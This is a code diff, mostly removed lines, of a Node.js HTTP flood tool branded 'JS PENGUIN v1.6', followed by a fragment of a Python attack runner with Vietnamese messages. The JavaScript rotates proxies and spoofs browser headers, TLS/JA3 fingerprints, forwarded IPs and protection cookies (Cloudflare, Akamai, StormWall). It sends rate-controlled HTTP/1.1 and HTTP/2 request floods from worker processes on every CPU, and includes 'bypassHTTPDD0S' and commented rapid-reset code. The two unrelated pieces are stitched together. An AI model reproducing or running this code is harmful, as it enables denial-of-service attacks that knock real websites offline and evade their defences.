-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
-                break;
-            case 128:
-                brandValue = `\"Not;A=Brand";v=\"24\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                versionList = `\"Not;A=Brand";v=\"24.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
-                break;
-            case 129:
-                brandValue = `\"Google Chrome\";v=\"${version}\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"${version}\"`;
-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                versionList = `\"Google Chrome\";v=\"${fullVersion}\", \"Not=A?Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\"`;
-                break;
-            case 130:
-                brandValue = `\"Not?A_Brand\";v=\"99\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                versionList = `\"Not?A_Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
-                break;
-            case 131:
-                brandValue = `\"Google Chrome\";v=\"${version}\", \"Chromium\";v=\"${version}\", \"Not_A Brand\";v=\"24\"`;
-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                brandValue = `\"Google Chrome\";v=\"${fullVersion}\", \"Chromium\";v=\"${fullVersion}\", \"Not_A Brand\";v=\"24.0.0.0\"`;
-            default:
-                brandValue = `\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"Google Chrome\";v=\"${version}\"`;
-                fullVersion = `${version}.0.${random_int(6610, 6790)}.${random_int(10, 100)}`;
-                versionList = `\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${fullVersion}\", \"Google Chrome\";v=\"${fullVersion}\"`;
-                break;
-        }
-
-        const platforms = [
-            "Windows NT 10.0; Win64; x64",
-            // "Macintosh; Intel Mac OS X 10_15_7",
-            // "X11; Linux x86_64",
-        ];
-
-        const platform = platforms[Math.floor(Math.random() * platforms.length)];
-
-        var secChUaPlatform, sec_ch_ua_arch, platformVersion;
-        switch (platform) {
-            case "Windows NT 10.0; Win64; x64":
-                secChUaPlatform = "\"Windows\"";
-                sec_ch_ua_arch = "x86";
-                platformVersion = "\"10.0.0\"";
-                break;
-            case "Macintosh; Intel Mac OS X 10_15_7":
-                secChUaPlatform = "\"macOS\"";
-                sec_ch_ua_arch = "arm"
-                platformVersion = "\"14.5.0\"";
-                break;
-            case "X11; Linux x86_64":
-                secChUaPlatform = "\"Linux\"";
-                sec_ch_ua_arch = "x86"
-                platformVersion = "\"5.15.0\"";
-                break;
-            default:
-                secChUaPlatform = "\"Windows\"";
-                sec_ch_ua_arch = "x86";
-                platformVersion = "\"10.0.0\"";
-                break;
-        }
-
-        var user_agent = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
-
-        if (ua_opt) {
-            user_agent = ua_opt;
-        }
-
-        var referer;
-        if (referer_opt) {
-            const extensions = ['com', 'net', 'org', 'io', 'co', 'gov'];
-            const extension = extensions[Math.random(Math.floor() * extensions.length)];
-            try {
-                if (referer_opt === "RAND") {
-                    referer = `https://${random_string(random_int(6, 9))}.${extension}/`;
-                } else {
-                    const referer_url = new URL(referer_opt);
-                    referer = referer_url.href;
-                }
-            } catch (err) {
-                referer = url.href;
-            }
-        }
-
-        var pathname = this.path;
-        if (pathname === "") {
-            pathname = "/"
-        }
-
-        if (pathname.includes('%RAND%')) {
-            // pathname = '/' + random_string(6);
-            pathname = pathname.replace("%RAND%", random_string(random_int(6, 9)));
-        }
-
-        // console.log(`pathname: ${pathname}`);
-
-        if (randpath) {
-            const pathname_length = pathname.length;
-            // console.log(`pathname[pathname_length]: ${pathname[pathname_length-1]}, length: ${pathname_length}`);
-            if (pathname[pathname_length-1] !== "/") {
-                pathname = `${pathname}/${random_string(random_int(6, 9))}`;
-            } else {
-                pathname = `${pathname}${random_string(random_int(6, 9))}`;
-            }
-        }
-
-        if (query_opt) {
-            pathname = pathname + '?' + random_string(random_int(6, 9))
-        }
-
-        // console.log(`final_pathname: ${pathname}`);
-        let request_method = reqmethod;
-        if (reqmethod === "RAND") {
-            request_method = request_methods[Math.floor(Math.random() * request_methods.length)]
-        }
-
-        let content_length = 0;
-        if (data_opt !== undefined) {
-            content_length = Buffer.from(data_opt, 'utf-8').length;
-        } else if (data_opt === "RAND") {
-            content_length = Buffer.from(random_string(random_int(10, 100)), 'utf-8').length;
-        }
-
-        if (cookie_opt === 'RAND') {
-            cookie_opt = random_cookies();
-        }
-
-        const headers = Object.entries({
-            ":method": request_method,
-            ":authority": url.hostname,
-            ":scheme": "https",
-            ":path": pathname
-        }).concat(Object.entries({
-            // ...(this.id > 1 && Math.random() < 0.40 && { "cache-control": Math.random() < 0.36 ? "max-age=0" : "no-cache" }),
-            // ...(Math.random() < 0.50) && { "cache-control": "max-age=0" },
-            ...(cache_opt && { "cache-control": Math.random() < 0.50 ? "max-age=0" : "no-cache" }),
-            ...(request_method === "POST" && { "content-length": content_length }),
-            ...(request_method === "POST" && { "content-type": "application/x-www-form-urlencoded" }),
-            "sec-ch-ua": brandValue,
-            ...(full_headers && { "sec-ch-ua-arch": sec_ch_ua_arch }),
-            ...(full_headers && { "sec-ch-ua-bitness": "\"64\"" }),
-            ...(full_headers && { "sec-ch-ua-full-version": fullVersion }),
-            ...(full_headers && { "sec-ch-ua-full-version-list": versionList }),
-            "sec-ch-ua-mobile": "?0",
-            ...(full_headers && { "sec-ch-ua-model": "\"\"" }),
-            "sec-ch-ua-platform": secChUaPlatform,
-            ...(full_headers && { "sec-ch-ua-platform-version": platformVersion }),
-            "upgrade-insecure-requests": "1",
-            "user-agent": user_agent,
-            // ...(full_headers && Math.random() < 0.36 && { "sec-purpose": "prefetch;prerender" }),
-            // ...(full_headers && Math.random() < 0.36 && { "purpose": "prefetch" }),
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            "sec-fetch-site": "none",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-user": "?1",
-            "sec-fetch-dest": "document",
-            "accept-encoding": encodings[~~Math.random(Math.floor() * encodings.length)], //"gzip, deflate, br, zstd",
-            "accept-language": languages[~~Math.random(Math.floor() * languages.length)],
-            // ...(extra_headers && { "dnt": "true" }),
-            // ...(extra_headers && { "x-client-session": "true" }),
-            ...(extra_headers && { "x-forwarded-for": Math.random() < 0.36 ? `${random_ip()}, ${this.proxy}` : this.proxy }),
-            ...(extra_headers && { "x-forwarded-proto": protocol }),
-            ...(extra_headers && { "x-forwarded-scheme": protocol }),
-            ...(extra_headers && { "x-real-ip": this.proxy }),
-            // ...(extra_headers && Math.random() < 0.5 && { [`x-request-source`]: `"mobile"` }),
-            // ...(extra_headers && Math.random() < 0.5 && { [`x-device-id`]: `"device-${Math.floor(Math.random() * 10000)}` }),
-            // ...(extra_headers && Math.random() < 0.5 && { [`x-session-token`]: `"session-token-${Math.random().toString(36).substring(2, 15)}"` }),
-            "priority": 'u=0, i',
-            ...(cookie_opt) && { "cookie": cookie_opt },
-            ...(referer) && { "referer": referer},
-            // ...(uam_opt) && { "x-forwarded-proto": "https"},
-            // ...(uam_opt) && { "x-forwarded-for": `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`}
-        })).filter(a => a[1] != null);
-
-        this.add_headers(Object.fromEntries(headers));
-        this.order_headers()
-        return this;
-    }
-
-    update_headers() {
-        if (this.path !== undefined && this.path !== url.pathname) {
-            this.replace_header(":path", this.path);
-        }
-        this.order_headers();
-        return this;
-    }
-
-    remove_header(header) {
-        const index = this.headers.findIndex(([header_index, _]) => header_index === header);
-        if (index > -1) {
-            this.headers.splice(index, 1);
-        }
-        return this;
-    }
-
-    order_headers() {
-        const order = [
-            ":method",
-            ":authority",
-            ":scheme",
-            ":path",
-            "cache-control",
-            "content-length",
-            "content-type",
-            "sec-ch-ua",
-            "sec-ch-ua-arch",
-            "sec-ch-ua-bitness",
-            "sec-ch-ua-full-version",
-            "sec-ch-ua-full-version-list",
-            "sec-ch-ua-mobile",
-            "sec-ch-ua-model",
-            "sec-ch-ua-platform",
-            "sec-ch-ua-platform-version",
-            "upgrade-insecure-requests",
-            "user-agent",
-            "sec-purpose",
-            "purpose",
-            "accept",
-            "sec-fetch-site",
-            "sec-fetch-mode",
-            "sec-fetch-user",
-            "sec-fetch-dest",
-            "accept-encoding",
-            "accept-language",
-            "priority",
-            "cookie",
-            "referer",
-            "x-forwarded-for",
-            "x-forwarded-proto",
-            "x-forwarded-scheme"
-        ];
-
-        const order_map = new Map(order.map((header, value) => [header, value]));
-
-        this.headers.sort(([header], [index]) => {
-            const index1 = order_map.get(header);
-            const index2 = order_map.get(index);
-            return (index1 !== undefined ? index1 : Infinity) - (index2 !== undefined ? index2 : Infinity);
-        });
-    }
-
-    build_str() {
-        this.remove_header("priority");
-        this.add_header("Host", url.hostname);
-        let requestStr = `GET ${this.path} HTTP/1.1\r\n`;
-
-        for (const [k, v] of this.headers) {
-            if (!k.startsWith(":")) {
-                requestStr += `${k}: ${v}\r\n`;
-            }
-        }
-
-        requestStr += 'Connection: keep-alive\r\n\r\n';
-        return requestStr;
-    }
-}
-
-function rate_range(base) {
-    const rate_eq = (base * 50) / 100;
-    const min_range = base - rate_eq;
-    const max_range = base + rate_eq;
-
-    return {
-        min: Math.max(0, min_range),
-        max_range
-    };
-}
-
-function random_fingerprint() {
-    const version = ssl_versions[random_int(0, ssl_versions.length - 1)];
-    const cipher = cipher_suites[random_int(0, cipher_suites.length - 1)];
-    const extension = extensions[random_int(0, extensions.length - 1)];
-    const curve = elliptic_curves[random_int(0, elliptic_curves.length - 1)];
-
-    const ja3 = `${version},${cipher},${extension},${curve}`;
-
-    return crypto.createHash('md5').update(ja3).digest('hex');
-}
-
-const process_rate = () => {
-    // console.log(`randrate: ${randrate}`);
-    if (randrate === "") {
-        rate = ratelimit
-    } else if (randrate.includes('-')) {
-        let rate_parts = randrate.split('-')
-        var minimum, maximum;
-        if (rate_parts.length == 2) {
-            try {
-                minimum = parseInt(rate_parts[0]);
-                maximum = parseInt(rate_parts[1]);
-                if (minimum > maximum) {
-                    rate = random_int(maximum, minimum);
-                } else {
-                    rate = random_int(minimum, maximum)
-                }
-                rate = random_int(parseInt(rate_parts[0]), parseInt(rate_parts[1]))
-            } catch (err) {
-                rate = random_int(1, 90)
-            }
-        }
-    } else if (randrate === "true") {
-        rate = random_int(1, 128)
-    } else if (randrate !== "") {
-        try {
-            const base_rate = parseInt(randrate)
-            // console.log(`base_rate: ${base_rate}`);
-            const range = rate_range(base_rate, 50);
-            // console.log(`min: ${rate_range.min}, max: ${rate_range.max}`);
-            rate = random_int(range.min, range.max);
-        } catch (err) {
-            rate = random_int(1, 90)
-        }
-    }
-
-    return rate
-}
-
-const start = async (host, port, proto, options = {}) => {
-    // console.log(options)
-    const timeout = (duration) => {
-        setTimeout(() => {
-            start(host, port, proto);
-        }, duration);
-    }
-    // const main_interval = setInterval(async () => {
-        // await timeout(Math.random() * 50);
-        const proxy = new Proxy(host, port, proto);
-        // console.log(`host: ${host}, proxy: ${proxy}`);
-        await proxy.connect(options).then(async (socket) => {
-            // console.log(`socket: ${socket}`);
-            const tls_conn = tls.connect({
-                socket: socket,
-                ALPNProtocols: http_opt === 1 ? ['http/1.1'] : http_opt === 2 ? ['h2'] : ['h2', 'http/1.1'],
-                servername: url.hostname,
-                ciphers: ciphers,
-                ...(Math.random() < random_int(0, 75) / 100) ? { sigalgs: sigalgs } : {},
-                ecdhCurve: Math.random() < 0.75 ? "X25519" : curves,
-                minVersion: versions[versions.length - 1],
-                maxVersion: versions[0],
-                requestOCSP: Math.random() < 0.50 ? true : false,
-                rejectUnauthorized: false,
-                ...(fingerprint_opt === true ? { fingerprint: random_fingerprint() } : {}),
-            }, async () => {
-                // console.log(`(${proto}://${host}:${port}) alpn: ${tls_conn.alpnProtocol}`)
-                var request = new Request(url.pathname);
-                request.set_path(url.pathname);
-                tls_conn.addListener("ratelimit", async (duration) => {
-                    // console.log(`${host}:${port} -> ratelimited for ${duration} seconds`);
-                    const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
-                    const index = proxies.indexOf(proxyKey);
-                    if (index > -1) proxies.splice(index, 1);
-                    tls_conn.end(() => tls_conn.destroy());
-                    await timeout(duration * 1000);
-                });
-                if (tls_conn.alpnProtocol != 'h2') {
-                    tls_conn.on('data', (data) => {
-                        const response = data.toString('utf8');
-                        // console.log(response)
-                        const status_regex = response.match(/HTTP\/1\.1 (\d{3})/);
-
-                        if (status_regex) {
-                            const status = parseInt(status_regex[1]);
-                            // console.log(`${host}:${port} # HTTP1 : status: ${status}`)
-                            status_codes[status] = (status_codes[status] || 0) + 1;
-
-                            if (status == 429 && ratelimit_opt) {
-                                tls_conn.emit('ratelimit', 10);
-                            }
-                        }
-                    });
-
-                    const sendHTTP1 = () => {
-                        request.generate_headers();
-                        const headers = request.build_str();
-                        tls_conn.write(headers, (err) => {
-                            // console.log(`${host}:${port} # HTTP1 : request sent`)
-                            if (!err) {
-                                setTimeout(() => {
-                                    sendHTTP1()
-                                }, 1000 / ratelimit)
-                            } else {
-                                // console.log(`${host}:${port} # HTTP1 : closed connection`)
-                                // status_codes["CLOSE"] = (status_codes["CLOSE"] || 0) + 1;
-                                tls_conn.end(() => tls_conn.destroy());
-                            }
-                        })
-                    };
-
-                    sendHTTP1();
-                }
-
-                if (http_opt === 1) tls_conn.end(() => tls_conn.destroy());
-
-                var http2 = new Http2(host);
-                let streamId = http2.id;
-
-                const updateWindow = Buffer.alloc(4);
-                updateWindow.writeUInt32BE(15663105, 0);
-
-                http2.frames.push(Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary'))
-
-                const settings_frame = http2.encode_frame(0, 0x4, http2.encode_settings([
-                    [SettingHeaderTableSize, 65536],
-                    [SettingEnablePush, 0],
-                    [SettingInitialWindowSize, 6291456],
-                    [SettingMaxHeaderListSize, 262144],
-                ]));
-
-                http2.frames.push(settings_frame);
-                const update_window_frame = http2.encode_frame(0, 0x8, updateWindow);
-                http2.frames.push(update_window_frame);
-
-                tls_conn.on('data', async (response) => {
-                    http2.data = Buffer.concat([http2.data, response]);
-                        while (http2.data.length >= 9) {
-                            const frame = http2.decode_frame(http2.data);
-                            if (frame != null) {
-                                http2.data = http2.data.subarray(frame.length + 9);
-                                // console.log(`[${frame.streamID}], Type: [${frame.type}], Flags: [${frame.flags}]`);
-                                if (frame.type === 1) {
-                                    const headers = http2.hpack.decode(frame.payload);
-                                    const statusHeader = headers.find(header => header[0] === ':status');
-                                    const cookieHeader = headers.find(header => header[0].toLowerCase() === 'set-cookie');
-                                    const redirectHeader = headers.find(header => header[0] === 'location');
-                        
-                                    if (statusHeader) {
-                                        const statusCode = statusHeader[1];
-                                   
-                                        status_codes[statusCode] = (status_codes[statusCode] || 0) + 1;
-                                        if (statusCode === "429" && ratelimit_opt) {
-                                            // console.log('ratelimited');
-                                            const ratelimit_duration = headers.find(header => header[0] === 'retry-after');
-                                            // console.log(`ratelimit duration: ${ratelimit_duration[1]}`);
-                                            tls_conn.emit("ratelimit", (parseInt(ratelimit_duration[1])));
-                                        }
-
-                                        if (['403', '400', '429'].includes(statusCode) && close_opt) {
-                                            tls_conn.end(() => tls_conn.destroy());
-                                        }
-                                    }
-
-                                    if (cookieHeader && cookieHeader[1]) {
-                                        const set_cookie = cookieHeader[1];
-                                        const current_cookies = request.find_header('cookie');
-                                        if (current_cookies) {
-                                            request.replace_header('cookie', `${current_cookies}, ${set_cookie}`)
-                                        } else {
-                                            request.add_header('cookie', set_cookie);
-                                        }
-                                        // const cookie_value = set_cookie.map(cookie => cookie[1].split(';')[0].trim()).join(';');
-                                        // console.log(`cookieheader: ${set_cookie}`);
-                                    }
-
-                                    if (redirectHeader && redirectHeader[1]) {
-                                        const redirect_url = new URL(redirectHeader[1], url.href);
-                                        const redirect = {
-                                            host: redirect_url.host,
-                                            path: redirect_url.pathname,
-                                            href: redirect_url.href,
-                                        }
-
-                                        if (redirect.host && redirect.host !== url.host) request.replace_header(":authority", redirect.host);
-                                        if (redirect.path) {
-                                            request.set_path(redirect.path);
-                                            request.replace_header(":path", redirect.path);
-                                        }
-                                    }
-                                } else if (frame.type == 4 && frame.flags == 0) {
-                                    tls_conn.write(http2.encode_frame(0, 0x4, "", 0x1));
-                                } else if (frame.type === 7) {
-                                    tls_conn.end(() => tls_conn.destroy());
-                                    return
-                                }
-                            } else {
-                                break;
-                            }
-                    }
-                });
-
-                tls_conn.write(Buffer.concat(http2.frames));
-
-                const sendHTTP2 = () => {
-                    var rate = process_rate();
-
-                    if (tls_conn.destroyed || socket.destroyed) return;
-
-                    const queue = [];
-
-                    for (var x = 0; x < ratelimit; x++) {
-                        request.generate_headers()
-
-                        const packed_headers = Buffer.concat([
-                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
-                            http2.hpack.encode(request.headers)
-                        ]);
-        
-                        queue.push(http2.encode_frame(streamId, 0x1, packed_headers, 0x1 | 0x4 | 0x20));
-
-                        const data_buffer = data_opt !== undefined ? (data_opt === "RAND" ? Buffer.from(random_string(random_int(10, 100)), 'utf-8') : Buffer.from(data_opt, 'utf-8')) : null;
-                        if (data_buffer) queue.push([http2.encode_frame(streamId, 0x0, data_buffer, 0x0)])
-            
-                        streamId += 2;
-                        http2.id += 2;
-                    }
-
-                    tls_conn.write(Buffer.concat(queue), (err) => {
-                        if (!err) {
-                            setTimeout(() => {
-                                sendHTTP2();
-                            }, 1000 / (rate));
-                        }
-                    });      
-                }
-                sendHTTP2();
-            }).once('close', () => {
-                // console.log(`${host}:${port} TLS connection closed`);
-                // clearInterval(main_interval);
-                tls_conn.removeAllListeners();
-                proxy.close();
-                // socket.close(() => socket.destroy());
-                return;
-            }).once('error', (err) => {
-                // console.log(`${host}:${port} TLS error: ${err.message}`);
-            }).once('end', () => {
-                tls_conn.removeAllListeners();
-                proxy.close();
-                // console.log(`${host}:${port} TLS connection end`);
-                // clearInterval(main_interval);
-                // socket.close(() => socket.destroy());
-                return;
-            });
-        }).catch((err) => {
-            if (checker) {
-                const proxyKey = !options.username && !options.password ? `${host}:${port}` : `${host}:${port}:${options.username}:${options.password}`;
-                const index = proxies.indexOf(proxyKey);
-                if (index > -1) proxies.splice(index, 1);
-            }
-            proxy.close();
-            // console.log(`socket error: ${err}`);
-            return;
-        })
-    // }, 1000);
-}
-
-if (cluster.isMaster) {
-    const workers = {};
-
-    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
-    
-    if (ip_opt === undefined) {
-        console.log(`
-            ${'________'.yellow.bold}${'o8A888888o_'.grey.bold}
-           ${'_o8888888888'.yellow}${'88'.grey.bold}${'K_]'.bgBlack.white.bold}${'888888o'.grey.bold}
-                      ${'~~~'.yellow}${'+8888888888o'.grey.bold}
-                          ${'~8888888888'.grey.bold}
-                          ${'o888'}${'88888888'.grey.bold}
-                         ${'o88888'}${'88888888'.grey.bold}
-                       ${'_888888888'}${'8888888'.grey.bold}
-                      ${'o88888888888'}${'8888888_'.grey.bold}
-                     ${'o8888888888888'}${'8888888_'.grey.bold}
-                    ${'_88888888888888'}${'88888888_'.grey.bold}
-                    ${'8888888888888888'}${'88888888_'.grey.bold}
-                    ${'8888888888888888'}${'888888888'.grey.bold}
-                    ${'8888888888888888'}${'8888888888'.grey.bold}
-                    ${'8888888888888888'}${'8888888888'.grey.bold}
-                    ${'888888888888888'}${'8'.white.bold}${'88888888888'.grey.bold}
-                    ${'~88888888888888'}${'88'.white.bold}${'8888888888_'.grey.bold}
-                     ${'(888888888888'}${'8888'.white.bold}${'8888888888'.grey.bold}
-                      ${'888888888888'}${'88888'.white.bold}${'8888888888'.grey.bold}
-                       ${'8888888888'}${'88888888'.white.bold}${'888888888_'.grey.bold}
-                       ${'~88888888'}${'888888888888'.white.bold}${'88888888'.grey.bold}
-                         ${'+888888'}${'8888888888888'.white.bold}${'8~~~~~'.grey.bold}
-                          ${'~=88'}${'8888888888888888o'.white.bold}
-                   ${'_=oooooooo'.yellow.bold}${'8888888888888888'.white.bold}${'88'.white}
-                    ${'_o88=8888='.yellow.bold}=~${'88888888'.yellow.bold}===8${'888_'.white}    ${'@benshii'.cyan.underline} # ${colors.dim.bold(new Date().toLocaleDateString("en"))}
-                    ${'~'.yellow.bold}   ${'=~~'.yellow.bold} ${'_o88888888='.yellow.bold}      ~~~      ${'JS PENGUIN'.bold} [${'v1.6'.underline}]
-                            ${'~ o8=~88=~'.yellow.bold}           
-    
-    
-        ———   ${'方法'.bold}${':'.red.bold}    [${'HTTP'.bold}${reqmethod.bold}]
-        ———   ${'目标'.bold}${':'.red.bold}    [${target.bold.underline}]
-        ———   ${'时间'.bold}${':'.red.bold}      [${`${time}`.bold} ${'秒'.bold}]
-        ———   ${'线程'.bold}${':'.red.bold}   [${`${threads} 核心`.bold}]
-        ———   ${'速率'.bold}${':'.red.bold}      [${`${ratelimit} 请求/秒`.bold}]
-        ———   ${'调试'.bold}${':'.red.bold}     [${debug === "true" ? 'true'.green.bold : debug === "false" ? 'false'.red.bold : Boolean(debug) ? 'true'.green.bold : 'false'.red.bold}]
-    `);
-    }
-
-    cluster.on('exit', (worker, code, signal) => {
-        if (signal !== 'SIGTERM' && signal !== 'SIGINT' && signal !== 'SIGTSTP') {
-            cluster.fork({ core: worker.id % os.cpus().length });
-        }
-    });
-
-    cluster.on("message", (worker, message) => {
-        workers[worker.id] = [worker, message];
-    });
-
-    if (Boolean(debug) && debug !== "false") {
-        var count = 1;
-        setInterval(() => {
-            let status_codes = {};
-            let worker_count = 0;
-            for (let w in workers) {
-                if (workers[w][0].state === "online") {
-                    worker_count++;
-                    // console.log(workers[w]);
-                    for (let st of workers[w][1]) {
-                        for (let code in st) {
-                            if (!status_codes[code]) status_codes[code] = 0;
-                            status_codes[code] += st[code];
-                        }
-                    }
-                } else {
-                    // console.log(`worker state: ${workers[w][0].state}`);
-                }
-            }
-            const statusses = Object.entries(status_codes)
-                .map(([key, value]) => `${colors.bold(key)}: ${colors.underline(value)}`)
-                .join(', ');
-
-            console.log(`[${'JS/PENGUIN'.magenta.bold}] | ${colors.bold('时间')}: [${colors.underline(time-count)}], ${colors.bold('状态')}: [${statusses}]`);
-            count++;
-        }, 1000);
-    }
-} else {
-    // console.log(`starting thread: ${random_string(5)}`);
-    let conns = 1;
-    let delay = delay_opt ? delay_opt : 1;
-    let proxy_protocol = proxytype;
-    // console.log(`proxy_protocol: ${proxy_protocol}`);
-    // console.log(`length: ${proxies.length}`);
-    // console.log(`delay: ${delay}`);
-
-    // let max_conns = connections ? undefined : proxies.length / threads;
-    let active_conns = 0;
-
-    for (var x = 0; x < conns; x++) {
-        const flood_interval = setInterval(() => {
-            let proxy_host, proxy_port, proxy_user, proxy_pass;
-            const proxy = proxies[~~(Math.random() * proxies.length)].split(':');
-            if (connections !== undefined && connections <= active_conns) clearInterval(flood_interval);
-            if (proxy && proxy.length >= 2) {
-                // console.log(proxy)
-                proxy_host = proxy[0]
-                proxy_port = parseInt(proxy[1])
-                if (proxy.length == 4) {
-                    proxy_user = proxy[2]
-                    proxy_pass = proxy[3]
-                }
-                // console.log(proxy_host, proxy_port)
-                start(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase(), { username: proxy_user, password: proxy_pass })
-                active_conns++
-            }
-        }, delay)
-        // for (const proxy of proxies) {
-        //     if (!proxy) continue;
-        //     if (connections !== undefined && connections <= active_conns) break;
-        //     let proxy_host, proxy_port;
-        //     proxy_host = proxy.split(':')[0]
-        //     proxy_port = parseInt(proxy.split(':')[1])
-        //     // console.log(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase())
-        //     start(proxy_host, Number(proxy_port), proxy_protocol.toUpperCase())
-        //     active_conns++;
-        // }
-    }
-
-    if (Boolean(debug) && debug !== "false") {
-        setInterval(() => {
-            if (status_queue.length >= 4) status_queue.shift();
-            status_queue.push(status_codes);
-            status_codes = {};
-            try {
-                if (process.connected) {
-                    process.send(status_queue);
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }, 250);
-    }
-}
-
-const exit = () => process.exit(1);
-setTimeout(exit, time * 1000);
-
-function bypassHTTPDD0S(proxy, target) {
-    console.log("正在绕过HTTPDD0S保护...");
-    setInterval(() => {
-        const headers = {
-            "User-Agent": random_string(15),
-            "X-Forwarded-For": random_ip()
-        };
-        sendRequest(proxy, target, headers);
-    }, 1000);
-}
-
-function spoofAkamaiFingerprint() {
-    return {
-        "X-Akamai-Request": "true",
-        "X-Request-ID": random_string(32),
-        "X-Forwarded-For": random_ip(),
-    };
-}
-
-function fixJA3Fingerprint() {
-    const ja3 = "769,49195,0-4-5-6-10-11-14-15-16-18-23-29-33-36-39-51-53,0-1-2-4,0";
-    return crypto.createHash('md5').update(ja3).digest('hex');
-}
-
-function handleRatelimit(statusCode) {
-    if (statusCode === 429) {
-        console.log("触发速率限制，正在重试...");
-        setTimeout(() => {
-            sendRequest();
-        }, 10000);  
-    }
-}
-
-function generateCookie(mode) {
-    let cookie = "";
-    switch (mode) {
-        case "CLOUDFLARE":
-            cookie = "cf_clearance=" + random_string(32);
-            break;
-        case "STORMWALL":
-            cookie = "sw_session=" + random_string(64);
-            break;
-        case "AKAMAI":
-            cookie = "akamai_secure=" + random_string(128);
-            break;
-        case "REACT":
-            cookie = "react_session=" + random_string(64);
-            break;
-        case "XSRF":
-            cookie = "XSRF-TOKEN=" + random_string(16);
-            break;
-        case "DDG":
-            cookie = "ddg_user=" + random_string(32);
-            break;
-        case "RANDOM":
-            cookie = random_string(64);
-            break;
-        case "custom":
-            cookie = "custom=" + random_string(64);
-            break;
-        default:
-            cookie = random_string(64);
-            break;
-    }
-    return cookie;
-}
-
-function cacheBypass() {
-    return { "cache-control": "no-cache, no-store, must-revalidate" };
-}
-
-function updateFingerprint() {
-    return {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-    };
-}
-
-function addUpdatedHeaders() {
-    return {
-        "X-Requested-With": "XMLHttpRequest",
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json"
-    };
-}
-
-function updateRandPath(path) {
-    if (Math.random() > 0.5) {
-        return path + "/random/" + random_string(10);
-    }
-    return path;
-}
-
-function detectProxyProtocol(proxy) {
-    if (proxy.startsWith("http")) {
-        return "http";
-    } else if (proxy.startsWith("socks")) {
-        return "socks5";
-    }
-    return "unknown";
-}
-
-function debugDataFrame(data) {
-    if (debug) {
-        console.log("调试数据: ", data);
-    }
-}
-
-function rapidReset() {
-    console.log("触发快速重置...");
-    /*
-    if (enabled('reset')) {
-                            (async () => {
-                                while (true) {
-                                    await new Promise(resolve => setTimeout(resolve, random_int(1000, 2000)));
-                                    await req.close(http2.constants.NGHTTP2_CANCEL);
-                                    await req.end()
-
-                                    await client.destroy();
-                                }
-                            })();
-                        }
-                    }
-
-                    let _rate;
-                    if (enabled('randrate')) {
-                        _rate = random_int(1, 90);
-                    } else {
-                        _rate = rate;
-                    }
-                    setTimeout(() => {
-                        request();
-                    }, 1000 / _rate);
-                }
-                request();
-            }).on('error', (err) => {
-                if (err.code === "ERR_HTTP2_GOAWAY_SESSION" || err.code === "ECONNRESET" || err.code == "ERR_HTTP2_ERROR") {
-                    client.close();
-                }
-            });
-        }).on('error', () => {
-            tls_conn.destroy();
-        });
-        socket.write(`CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
-    }).once('close', () => {
-        if (tls_conn) { tls_conn.end(() => { tls_conn.destroy(); attack(); }); }
-    });
-}
-    */
-}
-
-function updateCiphers() {
-    return [
-        "TLS_AES_128_GCM_SHA256",
-        "TLS_AES_256_GCM_SHA384",
-        "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
-    ];
-}
-
-function adaptiveHTTP2Settings() {
-    return {
-        maxConcurrentStreams: 100,
-        initialWindowSize: 65535,
-        headerTableSize: 4096
-    };
-}
-
-function generateRandomCharacters(length) {
-    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let result = '';
-    for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
-}
-
-function generateRandomStrings(n) {
-    let result = [];
-    for (let i = 0; i < n; i++) {
-        result.push(generateRandomCharacters(10));
-    }
-    return result;
-}
-
-function generateRandomNumbers(n) {
-    let result = [];
-    for (let i = 0; i < n; i++) {
-        result.push(Math.floor(Math.random() * 10000));
-    }
-    return result;
-}
+    print("[*] Tấn công đang chạy. Nhấn Ctrl+C để dừng.")
+    try:
+        if duration > 0:
+            time.sleep(duration)
+            print("[*] Hết thời gian. Thoát.")
+        else:
+            while True:
+                time.sleep(1)
+    except KeyboardInterrupt:
+        print("[*] Người dùng dừng. Thoát.")
+    finally:
+        # Dọn dẹp
+        for p in processes:
+            p.terminate()
+        sys.exit(0)
